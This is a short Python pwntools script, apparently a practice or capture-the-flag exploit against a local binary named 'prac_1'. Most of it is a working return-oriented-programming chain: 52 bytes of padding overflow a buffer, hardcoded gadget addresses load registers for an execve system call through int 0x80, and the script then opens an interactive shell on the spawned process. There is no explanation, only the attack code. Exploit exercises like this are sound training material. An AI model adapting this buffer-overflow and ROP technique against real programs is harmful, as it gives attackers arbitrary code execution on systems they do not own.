#!/usr/bin/env python
#gmltnscv
from pwn import *

buf_addr    = 0x80ea068
pop_eax_ret = 0x080b7c56
pop_ebx_ret = 0x080481c9
pop_ecx_ret = 0x080de295
pop_edx_ret = 0x0806eaaa
int_0x80    = 0x0806c725

payload =  "A"*52 
payload += p32(pop_eax_ret) + p32(0x0b)		# eax = 0x0b
payload += p32(pop_ebx_ret) + p32(buf_addr) 	# ebx = buf_addr
payload += p32(pop_ecx_ret) + p32(0x00)		# ecx = 0
payload += p32(pop_edx_ret) + p32(0x00) 	# edx = 0
payload += p32(int_0x80)			# CALL execve()

t = process(["./prac_1"])
print util.proc.pidof(t)
pause()

t.sendline(payload)
t.interactive()
